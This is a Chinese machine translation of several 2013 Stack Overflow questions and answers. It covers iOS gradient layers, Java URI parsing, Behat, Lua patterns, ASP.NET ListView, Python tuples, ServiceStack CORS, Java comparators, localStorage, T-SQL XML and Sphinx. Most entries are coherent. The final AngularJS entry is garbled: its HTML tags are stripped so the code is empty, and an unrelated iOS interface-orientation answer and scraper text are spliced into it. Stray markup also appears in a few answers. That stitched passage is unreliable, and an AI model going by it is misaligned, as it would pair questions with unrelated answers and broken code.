尽管该页面没有明确给出我想出的答案，[但该页面](http://blog.stevensanderson.com/2008/07/04/options-for-deploying-aspnet-mvc-to-iis-6/)确实有所帮助。

# ios - QuartzCore 的 CALayer 问题

> ID：14903073
> 
> 赞同：0
> 
> 时间：2013-02-15T20:47:45.977
> 
> 标签：ios, xcode, calayer, quartz-core, cagradientlayer

我正在使用 CAGradientLayer 来设置我的 uibuttons 样式。基本上在一个单元格中有三个按钮。当我首先设置 CAGradientLayer 属性时，它工作正常（我得到一个渐变）。

但是，当我将 CAGradientLayer 应用于第二个时，它确实出现在第二个上，但从第一个上消失了。如果我在第三个上做，那么它会出现在第三个上，然后从前两个上消失。

我应该在 UIButton 设置之间释放 CAGradientLayer 吗？

这是一些示例代码：

```
 //like button
 self.likeButton=[[UIButton alloc] initWithFrame:CGRectMake(10, 430, 80, 26)];
 [self.likeButton.titleLabel setFont:[UIFont boldSystemFontOfSize:12]];
 [self.likeButton.titleLabel setTextAlignment:NSTextAlignmentLeft];
 self.likeButton.tag=indexPath.row;
 [self.likeButton addTarget:self action:@selector(likeButtonPressed:) forControlEvents:UIControlEventTouchUpInside];
 [self.likeButton setBackgroundColor:[UIColor blackColor]];
 [self.likeButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
 [self.likeButton setTitleColor:[UIColor greenColor] forState:UIControlStateHighlighted];

 CAGradientLayer *btnGradient=[CAGradientLayer layer];
 btnGradient.frame=self.likeButton.bounds;
 btnGradient.colors=[NSArray arrayWithObjects:(id)[[UIColor colorWithRed:102.0f / 255.0f green:102.0f / 255.0f blue:102.0f / 255.0f alpha:1.0f] CGColor], (id)[[UIColor colorWithRed:41.0f / 255.0f green:41.0f / 255.0f blue:41.0f / 255.0f alpha:1.0f]CGColor], nil];
 [self.likeButton.layer insertSublayer:btnGradient atIndex:0];

 CALayer *btnLayer=self.likeButton.layer;
 [btnLayer setMasksToBounds:YES];
 [btnLayer setCornerRadius:5.0f];
 [btnLayer setBorderWidth:1.0f];
 [btnLayer setBorderColor:[[UIColor darkGrayColor]CGColor]];

 [cell addSubview:self.likeButton];

 //comment button
 UIButton *commentButton=[[UIButton alloc]initWithFrame:CGRectMake(110, 430, 80, 26)];
 [commentButton.titleLabel setFont:[UIFont boldSystemFontOfSize:12]];
 [commentButton.titleLabel setTextAlignment:NSTextAlignmentLeft];
 [commentButton setBackgroundColor:[UIColor blackColor]];
 [commentButton setTitle:@"Comment" forState:UIControlStateNormal];
 [commentButton addTarget:self action:@selector(commentButtonPressed:) forControlEvents:UIControlEventTouchUpInside];
 [commentButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
 [commentButton setTitleColor:[UIColor greenColor] forState:UIControlStateHighlighted];

 CAGradientLayer *commentBGLayer=[CAGradientLayer layer];
 commentBGLayer.frame=commentButton.bounds;
 commentBGLayer.colors=[NSArray arrayWithObjects:(id)[[UIColor colorWithRed:102.0f / 255.0f green:102.0f / 255.0f blue:102.0f / 255.0f alpha:1.0f] CGColor], (id)[[UIColor colorWithRed:41.0f / 255.0f green:41.0f / 255.0f blue:41.0f / 255.0f alpha:1.0f]CGColor], nil];
 [commentButton.layer insertSublayer:btnGradient atIndex:0];

 CALayer *commentBLayer=commentButton.layer;
 [commentBLayer setMasksToBounds:YES];
 [commentBLayer setCornerRadius:5.0f];
 [commentBLayer setBorderWidth:1.0f];
 [commentBLayer setBorderColor:[[UIColor darkGrayColor]CGColor]];
 [cell addSubview:commentButton]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T20:55:24.640

你有一个复制粘贴错误。您正在创建两个不同的渐变层，但您为每个按钮添加了相同的一个 - 这一行：

```
[commentButton.layer insertSublayer:btnGradient atIndex:0]; 
```

应该读：

```
[commentButton.layer insertSublayer:commentBGLayer atIndex:0]; 
```

# java - 使用 java.util.Scanner 打印出 Scheme Host 和 Path

> ID：14903075
> 
> 赞同：0
> 
> 时间：2013-02-15T20:47:52.417
> 
> 标签：java, uri, java.util.scanner

因此，我应该编写一个读取 URI 的程序，例如[http://www.cs.unca.edu/csci202](http://www.cs.unca.edu/csci202)，包含在第一个输入行中。如果构造函数引发异常，程序应该打印一条消息，提供有关该问题的一些信息。如果没有引发异常，程序应该使用 URI 的适当方法打印 URI 的方案、主机和路径。如果缺少这些 URI 属性中的任何一个，则不应打印它。我应该使用扫描仪来输入 URI，然后让它打印出方案主机路径或错误消息。到目前为止，我尝试过的任何事情都没有奏效。这是我到目前为止所拥有的：

```
import java.net.URI;

public class Home04 {

    public static void main(String[] args) {

        try {
            URI uri1 = new URI("");

            if (uri1.getScheme() != null) {
                System.out.println("Sceme:" + uri1.getScheme() );
            }
            if (uri1.getHost() !=null){
                System.out.println("Host:" + uri1.getHost() );
            }
            if (uri1.getPath() != null){
                System.out.println("Path:" + uri1.getPath() );
            }
        } catch (Exception e) {
            System.out.println("Exception" + e);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:26:12.180

Your parsing code is correct.

What you need to do is use below to get input from user

```
Scanner scanner = new Scanner(System.in);
URI uri1 = new URI(scanner.next()); 
```

# symfony - Behat+symfony2 访问自定义扩展中设置的容器参数

> ID：14903080
> 
> 赞同：1
> 
> 时间：2013-02-15T20:48:14.670
> 
> 标签：symfony, dependency-injection, symfony-2.1, behat, mink

（我将解释情况，以防有人知道更好的方法来帮助我想做的事情）。

使用 Symfony2 + Behat + Symfony2Extension + Mink +

我们有一个包含多个 url 的应用程序，这些 url 将在场景中被访问。

我知道您使用从 FeatureContext __construct 方法发送的参数，但我要做的是在 behat.yml 文件中设置 url，以便我们可以在自定义上下文中使用它们来访问 url。

看看扩展是如何工作的，我已经设置了依赖注入，如下所示：

```
class Extension implements ExtensionInterface
{

    /**
     * Loads a specific configuration.
     *
     * @param array            $config    Extension configuration hash (from behat.yml)
     * @param ContainerBuilder $container ContainerBuilder instance
     */
    public function load(array $config, ContainerBuilder $container)
    {
        $container->setParameter('url_one', $config['url_one']);
        $container->setParameter('url_two', $config['url_two']);

    }

    /**
     * Setups configuration for current extension.
     *
     * @param ArrayNodeDefinition $builder
     */
    public function getConfig(ArrayNodeDefinition $builder)
    {
        $builder->
            children()->
                scalarNode('one_url')->
                isRequired()->
                end()->
                scalarNode('two_url')->
                isRequired()->
                end()->
            end();
    }  
 code continues.... 
```

我的 behat.yml 看起来像这样：

```
default:
    extensions:
        Behat\MinkExtension\Extension:
            goutte: ~
            selenium2: ~
        Behat\Symfony2Extension\Extension: ~
        Acme\AcmeExtension\Extension:
            url_one: 'http://example1.com'
            url_two: 'http:/example2.com' 
```

现在在我的 FeatureContext.php 类中，我想做以下事情：

```
 $url = $kernel->getContainer()->getParameter('url_one'); 
```

但这不起作用，它从我的 Symfony2 应用程序返回参数，这是预期的，因为我启用了 symfony2extension。但我无法从扩展类访问参数或服务。

（请注意，如果我在加载方法中的 Extension 类中并且我调用了我刚刚设置的参数它返回它，所以我知道它已设置，但它必须设置为不同的容器？）

首先这可能吗？如果是这样，我应该怎么做才能让它发挥作用。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T22:06:36.177

显然，`$kernel->getContainer()`返回 Symfony2 应用内核的容器。这些内核和容器不与 Behat 共享。Behat 有自己的容器实例，用于管理自己的服务。这意味着扩展正在 Behat 容器内设置参数，但您正在尝试访问您的**应用程序**内核容器。这就是为什么你有不同的结果。

现在，问题是，如何将一些值从扩展传递到上下文类。答案是上下文初始化器。查看：

*   [https://github.com/Behat/MinkExtension/blob/master/src/Behat/MinkExtension/services/core.xml#L43-L47](https://github.com/Behat/MinkExtension/blob/master/src/Behat/MinkExtension/services/core.xml#L43-L47)
*   [https://github.com/Behat/MinkExtension/blob/master/src/Behat/MinkExtension/Context/Initializer/MinkAwareInitializer.php#L26-L77](https://github.com/Behat/MinkExtension/blob/master/src/Behat/MinkExtension/Context/Initializer/MinkAwareInitializer.php#L26-L77)

# lua - Lua string find - 如何处理带连字符的字符串？

> ID：14903085
> 
> 赞同：1
> 
> 时间：2013-02-15T20:48:33.273
> 
> 标签：lua

我有两个字符串 - 每个字符串都有很多行，如下所示：

```
string1 = "  DEFAULT-VLAN         | Manual     10.1.1.3      255.255.255.0 "
string2 = "  1       DEFAULT-VLAN                     | Port-based No    No" 
```

我将第一个字符串拆分为以下字符串：“DEFAULT-VLAN”、“|”、“Manual”... 然后我想在 string2 中查找 ID（“1”）以获得 vlanName（“DEFAULT-VLAN” ) 来自字符串 1。

我使用此代码来查找正确的子字符串：

```
vpos1, vpos2 = vlan:find("%d-%s-" .. vlanName .. "%s-|") 
```

但是 vpos1 和 vpos2 为零；当从 vlanName 中删除连字符（“-”）时，它正在工作。
Lua 不应该注意转义此类字符串中的特殊字符吗？字符串从我的 C++ 应用程序移交给 Lua，可能有很多特殊字符。
有没有简单的方法来解决这个问题？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:23:47.073

Lua 不是魔法。表达式`"%d-%s-" .. vlanName .. "%s-|"`所做的只是连接一些字符串，生成最终字符串。它不知道该字符串的用途。只`string.find`知道这一点，并且它不会对如何使用它给出的参数产生任何影响。

所以是的，`vlanName`将被解释为 Lua 模式。如果你想使用特殊字符，你需要对它们进行转义。我建议使用`string.gsub`它。它会是这样的：

```
vlanName:gsub("[%-...]", "%%%0") 
```

`...`您想逃脱的其他角色在哪里。

# business-objects - BO Universe 数据库迁移

> ID：14903088
> 
> 赞同：0
> 
> 时间：2013-02-15T20:48:47.643
> 
> 标签：business-objects

我有将 oracle DB 迁移到 sybase DB 的情况。迁移宇宙的最佳方法是什么。

我想到的几种方法..

1.  创建与 sybase DB 的新连接
2.  使用表刷新创建新连接。

任何其他建议......或者哪一个将是上述两个中最好的......

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T16:48:31.293

方法：

*   创建连接所需的一切 (OBDC)
*   迁移您的表（一对一）
*   更改 Universe 连接

如果您的 Universe 中有 sybase 不支持的功能，也许您可​​以改进一些问题（有时两个不同供应商之间的 SQL 语言存在一些差异）。

# plugins - 使用 SVG 插件部署 QtQuick 2.0 应用程序

> ID：14903090
> 
> 赞同：0
> 
> 时间：2013-02-15T20:48:55.007
> 
> 标签：plugins, deployment, qml, qt5, qt-quick

我的应用程序是使用 Qt 5.0.1 和 QtQuick 2.0 构建的。它在 Qt Creator 中运行良好，但我无法正确部署它。我将可执行文件（发布版本）复制到桌面上名为“项目部署”的目录中，并添加了一堆 DLL（发布版本，而不是调试）、我的 QML 文件和 SVG 图像。

除了根本不显示的 SVG 图像外，一切正常。我将其中一个转换为 GIF，它显示得很完美。很明显，我没有正确设置 QT SVG 插件。

在定义 QApplication 应用程序之后，我在 main() 中得到了这个：

```
QStringList libPaths = QCoreApplication::libraryPaths();
libPaths.append(QCoreApplication::applicationDirPath() + "/plugins");
app.setLibraryPaths(libPaths); 
```

在`Project Deployment/plugins`文件夹中，我放置了`iconengines/qsvgicon.dll`和`imageformats/qsvg.dll`。在`Project Deployment`文件夹中，我有 Qt5Xml.dll（因为我在某处读到因为 SVG 是 XML 格式，所以它使用该 dll）。

我完全没有想法（和互联网资源）。任何人都可以帮忙吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T16:58:30.330

如果您通过 Dependency Walker 运行 SVG 插件 (QSvg.dll)，您会发现它依赖于`Qt5Svg.dll`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:31:08.037

它需要放在`imageformats`文件夹中，例如`C:\Program Files\AppFolder\imageformats\qsvg.dll`

更多信息在这里：[http ://doc.qt.digia.com/stable/deployment-plugins.html](http://doc.qt.digia.com/stable/deployment-plugins.html)

# c# - 在 ListView 控件中查找控件

> ID：14903094
> 
> 赞同：6
> 
> 时间：2013-02-15T20:49:11.503
> 
> 标签：c#, asp.net, exception, webforms

我想在“ListView”控件中找到 ID =“Label”的“Label”控件。我试图用以下代码做到这一点：

```
((Label)this.ChatListView.FindControl("Label")).Text = "active"; 
```

但我得到了这个例外：**Object reference not set to an instance of an object**。

这里有什么问题？

这是aspx代码：

```
<asp:ListView ID="ChatListView" runat="server" DataSourceID="EntityDataSourceUserPosts">
    <ItemTemplate>
        <div class="post">
            <div class="postHeader">
                <h2><asp:Label ID="Label1" runat="server" 
                    Text= '<%# Eval("Title")  + " by " + this.GetUserFromPost((Guid?)Eval("AuthorUserID")) %>' ></asp:Label></h2>
                <asp:Label ID="Label" runat="server" Text="" Visible="True"></asp:Label>
                <div class="dateTimePost">
                   <%# Eval("PostDate")%>
                </div>
            </div>
            <div class="postContent">
                <%# Eval("PostComment") %>
            </div>
        </div>
    </ItemTemplate>

</asp:ListView> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T21:06:42.647

Listview 是一个数据绑定控件；所以它里面的控件对于不同的行会有不同的ID。您必须首先检测行，然后获取控件。获取此类控件的最佳方法是在诸如`OnItemDataBound`. 在那里，您可以执行以下操作来获取控制权：

```
protected void myListView_ItemDataBound(object sender, ListViewItemEventArgs e)
{
    if (e.Item.ItemType == ListViewItemType.DataItem)
    {
        var yourLabel = e.Item.FindControl("Label1") as Label;

        // ...
    }
} 
```

如果您想在 中获取它`Page_Load`，您将必须知道*特定的行*并将控件检索为：

```
var theLabel = this.ChatListView.Items[<row_index>].FindControl("Label1") as Label; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-11T10:48:12.270

此函数将从数据库中获取作者姓名，您只需调用您的方法获取作者姓名然后返回即可

```
protected string GetUserFromPost(Guid? x)
{
    // call your function to get Author Name
    return "User Name";
} 
```

要在列表视图中绑定标签，您必须在列表视图`ItemDataBound`事件中进行

```
protected void ChatListView_ItemDataBound(object sender, ListViewItemEventArgs e)
{
    if (e.Item.ItemType == ListViewItemType.DataItem)
    {
        Label lbl = e.Item.FindControl("Label") as Label;
        lbl.Text = "Active";
    }
} 
```

以下是列表视图 aspx 代码更改（只需添加`onitemdatabound="ChatListView_ItemDataBound"`）：

```
asp:ListView 
ID="ChatListView" 
runat="server" 
DataSourceID="EntityDataSourceUserPosts" 
onitemdatabound="ChatListView_ItemDataBound" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T20:55:58.867

在争论中应该是 Label1：

```
 ((Label)this.ChatListView.FindControl("Label1")).Text = "active"; 
```

这应该在数据绑定事件中。

[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.listview.itemdatabound.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.listview.itemdatabound.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-09-04T10:00:41.040

试试看：

```
protected void ChatListView_ItemDataBound(object sender, ListViewItemEventArgs e)
{
    if (e.Item is ListViewDataItem)
    {
         var yourLabel = e.Item.FindControl("Label1") as Label;
         // ...
    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-03-31T20:42:58.733

避免代码的一个简单解决方案`FindControl`是放置`OnInit`在标签上。

这会将您的页面代码更改为：`<asp:Label ID="Label" runat="server" Text="" Visible="True" OnInit="Label_Init"></asp:Label>`

在你后面的代码中，你现在将有一个这样的函数：

```
protected void Label_Init(object sender, EventArgs e)
{
     Label lblMyLabel = (Label)sender;
     lblMyLabel.Text = "My Text";
} 
```

# python - 组合元组以形成列表

> ID：14903095
> 
> 赞同：1
> 
> 时间：2013-02-15T20:49:10.717
> 
> 标签：python, python-2.7, tuples

```
data= [('a ', 1), ('b ', 3), ('a ', 4), ('b', 2),] 
```

如何获得两个列表，其中元组的第一个元素作为列表名称，第二个作为值？

```
a= [1,4]
b= [3,2] 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T20:54:17.007

正如您在上一个问题中所解释的，您不应该尝试更改您绑定的名称。`something = 3`[我的意思是的左侧。] 它只会带来麻烦。你可以使用 a`dict`代替，a`defaultdict`会让事情变得方便：

```
>>> data= [('a ', 1), ('b ', 3), ('a ', 4), ('b', 2),]
>>> from collections import defaultdict
>>> d = defaultdict(list)
>>> for k, v in data:
...     d[k.strip()].append(v)
...     
>>> d
defaultdict(<type 'list'>, {'a': [1, 4], 'b': [3, 2]}) 
```

之后

```
>>> d['a']
[1, 4]
>>> d['b']
[3, 2] 
```

会工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T20:51:08.387

由于您示例中的某些键有一些额外的空格，我正在使用`strip`：

```
In [11]: [x[1] for x in data if x[0].strip() == 'a']
Out[11]: [1, 4]

In [12]: [x[1] for x in data if x[0].strip() == 'b']
Out[12]: [3, 2] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T20:55:48.580

列夫的答案就是你要找的。此外，您可以按任意键进行分组：

```
grouped = defaultdict(list)
[grouped[key].append(value) for key, value in data] 
```

顺便说一句，[defaultdict](http://docs.python.org/2/library/collections.html)是许多值得研究的内置类型之一。有许多类型和功能可以解决您的日常问题。至少检查[operator](http://docs.python.org/2/library/operator.html)、[itertools](http://docs.python.org/2/library/itertools.html)和[functools](http://docs.python.org/2/library/functools.html)模块。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:06:08.300

您应该在这里使用字典，而不是创建多个变量。

```
In [14]: data= [('a ', 1), ('b ', 3), ('a ', 4), ('b',2),]

In [15]: dic={}

In [16]: for k,v in data:
   ....:     dic.setdefault(k.strip(),[]).append(v)
   ....:     

In [18]: dic
Out[18]: {'a': [1, 4], 'b': [3, 2]} 
```

# associations - UML中的关联关系

> ID：14903096
> 
> 赞同：3
> 
> 时间：2013-02-15T20:49:11.207
> 
> 标签：associations, structure, relationship, uml

当我阅读 Roger Pressman 书中的软件工程附录 1 时，

> 两个类之间的关联意味着它们之间存在结构关系

结构关系是什么意思？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T22:08:59.133

UML 区分“结构”和“行为”模型。类图、包图和其他一些捕获结构方面的内容。状态/序列/活动图捕获行为方面。

“结构性”意味着它随着时间的推移而成立。例如，Order 和 OrderLines 之间的关联（“Order 由 1 个或多个 OrderLines 组成/OrderLine 恰好是一个 Order 的一部分”）。或狗和人（“狗只属于一个人/人拥有许多狗”）。使用得当，关联从问题域中捕获不变的规则。以 Dog 为例：该协会表示，在任何给定时间，一只 Dog 不能被多个人拥有。狗是跑、坐还是吃都没关系：它必须只有一个所有者。还要注意所有者可能会随着时间而改变：但在任何时候都不能超过一个。

另一种方法是将关联视为可以使用关系数据库中的外键捕获的那种东西。

hth。

# cors - ServiceStack 在 OPTIONS 请求上返回 405

> ID：14903101
> 
> 赞同：3
> 
> 时间：2013-02-15T20:49:34.500
> 
> 标签：cors, servicestack, http-options-method

我正在使用 ServiceStack 构建一个 REST Web 服务。我想允许跨域请求，所以我注册了 CorsFeature 插件。

我的 AppHost 如下所示：

```
public class HomeAppHost : AppHostHttpListenerBase 
{
    public Context Context { get; set; }

    public HomeAppHost(Context context)
        : base("HomeAutomation", typeof(HomeInterfaceService).Assembly)
    {
        Context = context;
    }

    public override void Configure(Funq.Container container)
    {
        Plugins.Add(new CorsFeature());

        Routes
            .Add<HomeInterface>("/HomeInterface")
            .Add<HomeInterface>("/HomeInterface/{Id}")
            .Add<ViewModel>("/ViewModel")
            .Add<FunctionInput>("/Function")
        ;
    }
} 
```

然后，当向服务发出 OPTIONS 请求时，会导致 405 Method Not Allowed：

要求：

```
OPTIONS /Function HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0 FirePHP/0.7.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: nl,en-us;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Origin: http://localhost
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
x-insight: activate
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache 
```

回复：

```
HTTP/1.1 405 Method Not Allowed
Content-Length: 1837
Content-Type: application/xml
Server: Microsoft-HTTPAPI/2.0
Date: Fri, 15 Feb 2013 20:19:33 GMT 
```

**编辑**

* * *

向服务添加一个空的 Options 方法确实可以防止触发 405。但是，响应似乎是空的：

```
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Server: Microsoft-HTTPAPI/2.0
Date: Sat, 16 Feb 2013 08:44:21 GMT 
```

添加以下内容也会给我一个空响应：

```
RequestFilters.Add((httpReq, httpRes, requestDto) =>
{
    //Handles Request and closes Responses after emitting global HTTP Headers
    if (httpReq.HttpMethod == "OPTIONS")
        httpRes.End();
}); 
```

我不得不将 httpReq.Method 更改为 httpReq.HttpMethod 并将 httpRes.EndServiceStackRequest() 更改为 httpRes.End()。它是否正确？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:35:54.420

**[ServiceStack](http://www.servicestack.net)中的**405**表示该方法尚未实现。**

 **所以你需要为`Options`动词添加一个处理程序。方法体可以为空，例如：

```
public MyService : Service 
{ 
    public void Options(HomeInterface request) {}
} 
```

如果您想允许**所有**Options 请求（即不管它是哪个服务），您可以注册一个全局请求过滤器，例如：

```
this.RequestFilters.Add((httpReq, httpRes, requestDto) => {
   //Handles Request and closes Responses after emitting global HTTP Headers
    if (httpReq.Method == "OPTIONS") 
        httpRes.EndServiceStackRequest();
}); 
```

如果您想更细粒度地控制选项请求的处理方式，您可以在[过滤器属性](https://github.com/ServiceStack/ServiceStack/wiki/Filter-attributes)中使用相同的逻辑。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-16T10:11:07.690

不确定这是否是正确的方法，但我现在正在使用请求过滤器自己处理 CORS：

```
RequestFilters.Add((httpReq, httpRes, requestDto) =>
{
    httpRes.AddHeader("Access-Control-Allow-Origin", "*");

    if (httpReq.HttpMethod == "OPTIONS")
    {
        httpRes.AddHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
        httpRes.AddHeader("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
        httpRes.End();
    }
}); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-30T10:50:06.857

我对这种行为有点困惑。不想在每个服务上创建虚拟 Options() 方法并在每个 Dto 类上添加假路由。我所需要的 - ServiceStack AppHost 在每个 url 上以相同的行为响应每个“选项”请求。所以这就是我结束的。

为选项创建了我自己的处理程序：

```
public class OptionsRequestHandler : IHttpHandler, IServiceStackHttpHandler
{
    public bool IsReusable
    {
        get { return true; }
    }

    public void ProcessRequest(HttpContext context)
    {
        ProcessRequest(null, new HttpResponseWrapper(context.Response), null);          
    }

    public void ProcessRequest(IHttpRequest httpReq, IHttpResponse httpRes, string operationName)
    {
        httpRes.EndServiceStackRequest();
        return;
    }
} 
```

然后将其添加到主机配置方法中：

```
this.CatchAllHandlers.Add((httpMethod, pathInfo, filePath) =>
{
    if ("OPTIONS".Equals(httpMethod, System.StringComparison.InvariantCultureIgnoreCase))
        return new OptionsRequestHandler();
    else return null;
}); 
```

当然也没有忘记 CorsFeature：

```
host.Plugins.Add(new ServiceStack.ServiceInterface.Cors.CorsFeature()); 
```

因此，无论 url、dto 和服务声明如何，ServiceStack 都会对每个带有“OPTIONS”标头的请求以“200 OK”响应。**

# compare - 在 Java 1.5 和 Java 1.7 中覆盖 'compare()' 时不返回 0 的缺点

> ID：14903104
> 
> 赞同：0
> 
> 时间：2013-02-15T20:49:42.143
> 
> 标签：compare, java, comparator, comparable

这是我写的比较器，用于根据成本对节点进行排序。

```
public class MyCostComparator implements Comparator<Node>{
    public int compare(Node a, Node b){
        if(a.pathCost > b.pathCost)
            return 1;
        else
            return -1;
    }
} 
```

我发现它在我的机器（Java 1.7）和 Uni 的服务器（Java 1.5）上的行为是不同的。但是，当我做到这一点时：

`if(a.pathCost >= b.pathCost)`，它似乎在 1.5 上运行良好，但在 1.7 上则相反。

另外，当值相等时不返回零的缺点是什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-15T20:52:18.460

“缺点”是`TreeSet`, `TreeMap`, 和基本上所有基于比较的数据结构根本不起作用。一点儿都没有。特别是，*将*`TreeSet.contains`始终*返回*，`false`并且`TreeMap.get`始终返回 null。

 ** * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-15T20:52:35.040

如果你从不返回零，那么一个对象将看起来不等于它自己。这违反了合同`Comparable`并阻止任何依赖它的集合正常工作（或根本不工作）。

Java 7 还引入了一种新的排序算法，如果它检测到违反了合约`Collections.sort`，就会抛出一个。这是对早期版本的更改，它默默地忽略了这一事实。`IllegalArgumentException``Comparable`*

# javascript - 是否可以将 localStorage 项目保密或隐藏？

> ID：14903106
> 
> 赞同：0
> 
> 时间：2013-02-15T20:49:44.453
> 
> 标签：javascript, local-storage

我想阻止某人做-

`localStorage[key]`在控制台或类似的地方看看我在那里有什么。

这可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T20:53:56.967

不，那是不可能的。

这样的特性是没有意义的，因为在你的代码中放置一个断点并在你从本地存储读取它之后查看值是很容易的。

您可以对放入存储中的值进行打乱，使其含义不明显，但由于使用它的代码是可见的，您只能使值更难看到，而不是不可能。

# sql - T-SQL使用变量从xml检索sql属性

> ID：14903107
> 
> 赞同：3
> 
> 时间：2013-02-15T20:49:46.840
> 
> 标签：sql, sql-server, xml, xquery

我正在尝试从传入所需属性名称的 XML 变量中检索 XML 属性。第一个 select 语句可以很好地检索正确的属性值。但是，当我尝试在 SQL 变量中设置所需的属性名称时，显示的只是字符串`/root/attribs/@id`而不是实际值。我尝试了许多`@path`变量的排列，但都无济于事。

我在这里想念什么？

```
DECLARE @XMLString XML = '<root><attribs flags="1" id="test_id" platform="test_platform" /></root>';

SELECT
    flags = x.c.value('(/root/attribs/@flags)[1]', 'nvarchar(50)') ,
    id = x.c.value('(/root/attribs/@id)[1]', 'nvarchar(50)') ,
    [platform] = x.c.value('(/root/attribs/@platform)[1]', 'nvarchar(50)')
FROM
    @XMLString.nodes('/*') x ( c );

DECLARE @Path NVARCHAR(50) = '/root/attribs/@id';
SELECT
    result = x.c.value('(sql:variable("@Path"))[1]', 'nvarchar(50)')
FROM
    @XMLString.nodes('/*') x ( c ); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-16T00:14:36.967

这将允许您指定属性名称。

```
DECLARE @XMLString xml = '
  <root>
    <attribs flags="1" id="test_id" platform="test_platform" />
  </root>'

DECLARE @Attribute nvarchar(max) = 'flags'

SELECT
  t.x.value('(/root/attribs/@*[local-name() = sql:variable("@Attribute")])[1]', 'nvarchar(max)')
FROM @XMLString.nodes('/*') t(x) 
```

# python-sphinx - Sphinx 自定义 autoclass 输出

> ID：14903111
> 
> 赞同：5
> 
> 时间：2013-02-15T20:50:04.003
> 
> 标签：python-sphinx

我有一个包含几个类的模块。目前我正在使用`..automodule`记录模块。我希望每个类都有自己的带有类名的标题部分。我可以通过替换`..automodule foo`为：

```
Bar
===

..autoclass foo.Bar

Baz
===

..autoclass foo.Baz

... 
```

但是，这需要我手动列出我为其执行此操作的每个模块中的每个类。自定义 automodule 生成的内容的最佳方法是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-05-15T19:13:42.893

Sphinx 不像 Epydoc 或 Doxygen 那样直接用于从源代码生成 API 文档。这是一种不同的工具。

Sphinx 适用于 .rst (reStructuredText) 文件，如果您希望每个类都有自己的标题和类名，您必须自己添加标题并使用`.. autoclass::`. 不能只用`.. automodule::`. 是的，这很不方便（[这里](https://stackoverflow.com/q/5319210/407651)表达了类似的观点）。另请参阅[此答案](https://stackoverflow.com/a/2441159/407651)和[此答案](https://stackoverflow.com/a/6109098/407651)。

该问题可以通过遍历 Python 代码并生成 .rst 输出的脚本来缓解。Sphinx 已经带有这样的脚本[sphinx-apidoc](http://sphinx-doc.org/man/sphinx-apidoc.html)。但是，它不会产生任何`.. autoclass::`指令，只会产生`.. automodule::`.

这是另一个可以输出的脚本`.. autoclass::`：[https](https://github.com/PyMVPA/PyMVPA/blob/master/tools/apigen.py) ://github.com/PyMVPA/PyMVPA/blob/master/tools/apigen.py 。也许你可以使用它。

# javascript - html中的angularjs表达式 tag I have a scope like $scope.doc_details in my angularjs controller, and I want to use it to display a pdf file by using a tag, like this: but it doesn't get loaded in the browser, in my chrome console, all I see is: Failed to load resource: the server responded with a status of 404 (Not Found) http://localhost/%7B%7Bdoc_details.file_url%7D%7D and when I just display it using {{doc_details.file_url}} it show the value. shouldAutorotateToInterfaceOrientation is deprecated in iOS 6, you should override supportedInterfaceOrientations method of UIViewController There is quote from doc: In iOS 6, your app supports the interface orientations defined in your app’s Info.plist file. A view controller can override the supportedInterfaceOrientations method to limit the list of supported orientations. Generally, the system calls this method only on the root view controller of the window or a view controller presented to fill the entire screen; child view controllers use the portion of the window provided for them by their parent view controller and no longer participate in directly in decisions about what rotations are supported. The intersection of the app’s orientation mask and the view controller’s orientation mask is used to determine which orientations a view controller can be rotated into. You can override the preferredInterfaceOrientationForPresentation for a view controller that is intended to be presented full screen in a specific orientation. javascripthtmlangularjs 4 4 回答 4 This answer is useful 34 从AngularJS 1.1.4开始，您可以使用属性的ng-attr-前缀：data 请参阅AngularJS 上ngAttr的绑定到任意属性部分：插值和数据绑定。 于 2014-02-13T11:10:54.360 回答 This answer is useful 25 这里的问题是浏览器正在查看 在 Angular 编译之前在 DOM 中，显然{{doc_details.file_url}}不是有效的 URL。 指令在这里可以成为你的朋友。 假设我们要写： 我们可以创建一个指令： app.directive('pdf', function() { return { restrict: 'E', link: function(scope, element, attrs) { var url = scope.$eval(attrs.src); element.replaceWith(''); } }; }); 